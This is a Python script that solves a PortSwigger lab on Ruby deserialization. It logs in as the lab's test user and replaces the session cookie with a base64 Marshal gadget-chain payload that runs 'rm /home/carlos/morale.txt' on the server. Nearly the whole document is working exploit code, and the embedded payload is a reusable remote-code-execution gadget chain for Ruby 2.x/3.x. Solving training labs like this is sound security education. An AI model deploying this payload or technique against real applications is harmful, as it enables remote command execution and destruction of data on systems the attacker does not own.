# Exploiting Ruby deserialization using a documented gadget chain

# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#		PAYLOAD GENERATED WITH deserial.rb:
#		https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

RUBY_PAYLOAD = "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ=="


##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_cookies(s):
	session = s.cookies['session']
	parsed_session = urllib.parse.unquote(session)
	print('\n[+] Found Session Cookie:\t\t%s' % parsed_session)
	time.sleep(1)
	decoded_session = base64.b64decode(parsed_session).decode()
	print('\n[+] Decoded Session Cookie:\n%s' % decoded_session)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting Ruby deserialization using a documented gadget chain')
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting Ruby deserialization using a documented gadget chain")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos morale.txt file...\n')
			time.sleep(1)
			print('[+] Trying to send the payload generated by deserial.rb...')
			r = connect_as_wiener(s, url)
			get_cookies(s)
			cookie = RUBY_PAYLOAD
			s.cookies.clear()
			cookies= {'session': cookie}
			print('[+] Sending the request...')
			r = s.get(url, cookies=cookies)
			if r.status_code == 500:
				print('[+] Request sent results to an internal error !')
			time.sleep(2)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
